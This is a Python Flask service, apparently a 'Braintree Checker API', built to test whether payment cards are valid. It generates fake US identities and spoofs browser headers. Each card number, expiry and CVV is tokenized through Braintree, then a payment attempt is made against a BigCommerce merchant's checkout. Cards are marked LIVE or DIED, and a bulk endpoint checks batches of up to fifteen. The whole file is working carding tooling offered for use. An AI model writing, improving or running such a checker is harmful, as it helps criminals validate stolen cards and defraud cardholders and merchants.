from flask import Flask, jsonify, request
import requests
import random
import time
import logging
from datetime import datetime

app = Flask(__name__)

# Configurar logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ==================== FUNÇÕES AUXILIARES ====================

def gerar_dados_usa():
    """Gera dados aleatórios de endereço nos EUA"""
    try:
        response = requests.get('https://randomuser.me/api/?nat=us', timeout=10)
        if response.status_code == 200:
            data = response.json()['results'][0]
            
            return {
                'first_name': data['name']['first'],
                'last_name': data['name']['last'],
                'city': data['location']['city'],
                'state': data['location']['state'],
                'zip_code': data['location']['postcode'],
                'street': f"{data['location']['street']['number']} {data['location']['street']['name']}",
                'phone': data['phone'].replace('-', ''),
                'email': data['email']
            }
    except Exception as e:
        logger.warning(f"API falhou, usando dados fixos: {e}")
    
    # Dados de fallback
    cidades_estados = [
        {'city': 'New York', 'state': 'NY', 'zip': '10001'},
        {'city': 'Los Angeles', 'state': 'CA', 'zip': '90001'},
        {'city': 'Chicago', 'state': 'IL', 'zip': '60601'},
    ]
    
    cidade_escolhida = random.choice(cidades_estados)
    nomes = ['James', 'John', 'Robert', 'Michael', 'William']
    sobrenomes = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones']
    
    return {
        'first_name': random.choice(nomes),
        'last_name': random.choice(sobrenomes),
        'city': cidade_escolhida['city'],
        'state': cidade_escolhida['state'],
        'zip_code': cidade_escolhida['zip'],
        'street': f"{random.randint(100, 999)} Main Street",
        'phone': f"555{random.randint(100, 999)}{random.randint(1000, 9999)}",
        'email': f"user{random.randint(1000, 9999)}@gmail.com"
    }

def consultar_bin(bin_number):
    """Consulta dados do BIN do cartão via API externa"""
    try:
        response = requests.get(f'https://lookup.binlist.net/{bin_number}', timeout=10)
        if response.status_code == 200:
            bin_data = response.json()
            return {
                'bank': bin_data.get('bank', {}).get('name', 'N/A'),
                'type': bin_data.get('type', 'N/A'),
                'scheme': bin_data.get('scheme', 'N/A'),
                'country': bin_data.get('country', {}).get('name', 'N/A'),
                'currency': bin_data.get('country', {}).get('currency', 'N/A')
            }
    except Exception as e:
        logger.warning(f"Erro na consulta BIN: {e}")
    
    return {'bank': 'N/A', 'type': 'N/A', 'scheme': 'N/A', 'country': 'N/A', 'currency': 'N/A'}

def interpretar_status(status_code):
    """Converte código HTTP em status legível"""
    if status_code == 200:
        return "✅ LIVE"
    elif status_code == 201:
        return "✅ LIVE"
    elif status_code in [400, 401, 402, 403, 404]:
        return "❌ DIED"
    elif status_code == 422:
        return "❌ DIED"
    elif status_code == 429:
        return "⚠️ RETRY"
    elif status_code >= 500:
        return "🔧 ERROR"
    else:
        return f"❓ UNKNOWN ({status_code})"

# ==================== LÓGICA PRINCIPAL DE VERIFICAÇÃO ====================

def fazer_verificacao_braintree(cc, mm, yy, cvv):
    """Executa a verificação real na Braintree"""
    
    user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    ]
    
    resultados = []
    status_final = "UNKNOWN"
    bin_info = consultar_bin(cc[:6])
    
    try:
        # 👤 Gerar dados aleatórios
        dados_aleatorios = gerar_dados_usa()
        resultados.append(f"Dados: {dados_aleatorios['first_name']} {dados_aleatorios['last_name']}")

        # ==================== PRIMEIRA REQUISIÇÃO - BRAINTREE ====================
        user_agent_escolhido = random.choice(user_agents)
        
        headers_braintree = {
            'accept': '*/*',
            'accept-language': 'en-US',
            'authorization': 'Bearer SEU_TOKEN_BRAINTREE_AQUI',  # 🔑 ATUALIZE AQUI
            'content-type': 'application/json',
            'origin': 'https://assets.braintreegateway.com',
            'referer': 'https://assets.braintreegateway.com/',
            'sec-ch-ua': '"Chromium";v="127", "Not)A;Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'user-agent': user_agent_escolhido,
        }

        json_data_braintree = {
            'clientSdkMetadata': {
                'source': 'client',
                'integration': 'custom',
                'sessionId': f"session_{random.randint(100000, 999999)}",
            },
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token } }',
            'variables': {
                'input': {
                    'creditCard': {
                        'number': cc,
                        'expirationMonth': mm,
                        'expirationYear': yy,
                        'cvv': cvv,
                        'cardholderName': f"{dados_aleatorios['first_name']} {dados_aleatorios['last_name']}",
                        'billingAddress': {
                            'countryName': 'United States',
                            'postalCode': dados_aleatorios['zip_code'],
                            'streetAddress': dados_aleatorios['street'],
                        },
                    },
                    'options': {'validate': False},
                },
            },
            'operationName': 'TokenizeCreditCard',
        }

        resultados.append("Fazendo primeira requisição...")
        response1 = requests.post(
            'https://payments.braintree-api.com/graphql', 
            headers=headers_braintree, 
            json=json_data_braintree, 
            timeout=15
        )
        
        status1 = interpretar_status(response1.status_code)
        resultados.append(f"Resposta 1: {status1}")
        
        if response1.status_code != 200:
            status_final = "DIED"
            return status_final, resultados, bin_info
            
        # ✅ Pegar token se deu certo
        tok = response1.json()['data']['tokenizeCreditCard']['token']
        resultados.append(f"Token obtido: {tok[:20]}...")

        # ⏳ Delay entre requisições
        time.sleep(random.uniform(2, 4))

        # ==================== SEGUNDA REQUISIÇÃO - BIGCOMMERCE ====================
        user_agent_escolhido2 = random.choice(user_agents)
        
        headers_bigcommerce = {
            'Accept': 'application/json',
            'Authorization': 'JWT SEU_TOKEN_BIGCOMMERCE_AQUI',  # 🔑 ATUALIZE AQUI
            'Content-Type': 'application/json',
            'Origin': 'https://basiccopper.com',
            'Referer': 'https://basiccopper.com/',
            'User-Agent': user_agent_escolhido2,
            'sec-ch-ua': '"Chromium";v="127", "Not)A;Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Windows"',
        }

        json_data_bigcommerce = {
            'customer': {
                'customer_group': {'name': 'Default Customer Group'},
                'geo_ip_country_code': 'US',
                'session_token': f"session_{random.randint(100000, 999999)}",
            },
            'order': {
                'billing_address': {
                    'city': dados_aleatorios['city'],
                    'country_code': 'US',
                    'country': 'United States',
                    'first_name': dados_aleatorios['first_name'],
                    'last_name': dados_aleatorios['last_name'],
                    'phone': dados_aleatorios['phone'],
                    'state_code': dados_aleatorios['state'],
                    'state': dados_aleatorios['state'],
                    'street_1': dados_aleatorios['street'],
                    'zip': dados_aleatorios['zip_code'],
                    'email': dados_aleatorios['email'],
                },
                'currency': 'USD',
                'totals': {'grand_total': 3241},
            },
            'payment': {
                'gateway': 'braintree',
                'method': 'credit-card',
                'credit_card_token': {'token': tok},
            },
        }

        resultados.append("Fazendo segunda requisição...")
        response2 = requests.post(
            'https://payments.bigcommerce.com/api/public/v1/orders/payments', 
            headers=headers_bigcommerce, 
            json=json_data_bigcommerce, 
            timeout=15
        )
        
        status2 = interpretar_status(response2.status_code)
        resultados.append(f"Resposta 2: {status2}")
        
        # 🎯 DEFINIR RESULTADO FINAL
        if response2.status_code == 200:
            status_final = "LIVE"
            resultados.append("RESULTADO FINAL: ✅ LIVE")
        else:
            status_final = "DIED"
            resultados.append("RESULTADO FINAL: ❌ DIED")

    except requests.exceptions.Timeout:
        resultados.append("TIMEOUT - Servidor demorou muito")
        status_final = "DIED"
    except Exception as e:
        resultados.append(f"ERRO: {str(e)}")
        status_final = "DIED"

    return status_final, resultados, bin_info

# ==================== ENDPOINTS DA API ====================

@app.route('/api/chk', methods=['POST'])
def verificar_cartao():
    """Endpoint para verificação única de cartão"""
    try:
        data = request.json
        cc = data.get('cc', '').strip()
        mm = data.get('mm', '').strip()
        yy = data.get('yy', '').strip()
        cvv = data.get('cvv', '').strip()
        
        # Validar dados
        if not (len(cc) >= 15 and len(mm) == 2 and len(yy) == 4 and len(cvv) >= 3):
            return jsonify({'erro': 'Dados do cartão inválidos'}), 400
        
        # Fazer verificação
        status_final, logs, bin_info = fazer_verificacao_braintree(cc, mm, yy, cvv)
        
        resultado = {
            'cartao': f"{cc[:6]}...{cc[-4:]}",
            'validade': f"{mm}/{yy}",
            'cvv': cvv,
            'status': status_final,
            'bin_info': bin_info,
            'logs': logs[-5:],  # Últimos 5 logs
            'timestamp': datetime.now().isoformat()
        }
        
        return jsonify(resultado)
        
    except Exception as e:
        logger.error(f"Erro no endpoint /chk: {e}")
        return jsonify({'erro': 'Erro interno no servidor'}), 500

@app.route('/api/mass', methods=['POST'])
def verificar_massa():
    """Endpoint para verificação em massa"""
    try:
        data = request.json
        lista_cartoes = data.get('cartoes', [])
        
        if len(lista_cartoes) > 15:
            return jsonify({'erro': 'Máximo de 15 cartões por requisição'}), 400
        
        resultados = []
        
        for i, cartao in enumerate(lista_cartoes):
            cc = cartao.get('cc', '').strip()
            mm = cartao.get('mm', '').strip()
            yy = cartao.get('yy', '').strip()
            cvv = cartao.get('cvv', '').strip()
            
            # Validar cartão atual
            if not (len(cc) >= 15 and len(mm) == 2 and len(yy) == 4 and len(cvv) >= 3):
                resultados.append({
                    'cartao': f"{cc[:6]}...{cc[-4:]}" if cc else 'INVALIDO',
                    'validade': f"{mm}/{yy}",
                    'status': '❌ INVALID',
                    'erro': 'Dados inválidos'
                })
                continue
            
            # Fazer verificação
            status_final, logs, bin_info = fazer_verificacao_braintree(cc, mm, yy, cvv)
            
            resultados.append({
                'cartao': f"{cc[:6]}...{cc[-4:]}",
                'validade': f"{mm}/{yy}",
                'status': status_final,
                'bin_info': bin_info,
                'numero': i + 1
            })
            
            # Delay entre verificações
            if i < len(lista_cartoes) - 1:
                time.sleep(1)
        
        return jsonify({
            'total': len(lista_cartoes),
            'processados': len(resultados),
            'resultados': resultados
        })
        
    except Exception as e:
        logger.error(f"Erro no endpoint /mass: {e}")
        return jsonify({'erro': 'Erro interno no servidor'}), 500

@app.route('/health', methods=['GET'])
def health_check():
    """Health check da API"""
    return jsonify({
        'status': 'online', 
        'timestamp': datetime.now().isoformat(),
        'service': 'Braintree Checker API'
    })

@app.route('/')
def home():
    """Página inicial"""
    return jsonify({
        'message': 'Braintree Checker API',
        'version': '1.0',
        'endpoints': {
            '/api/chk': 'Verificar cartão único (POST)',
            '/api/mass': 'Verificar até 15 cartões (POST)',
            '/health': 'Status da API (GET)'
        }
    })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
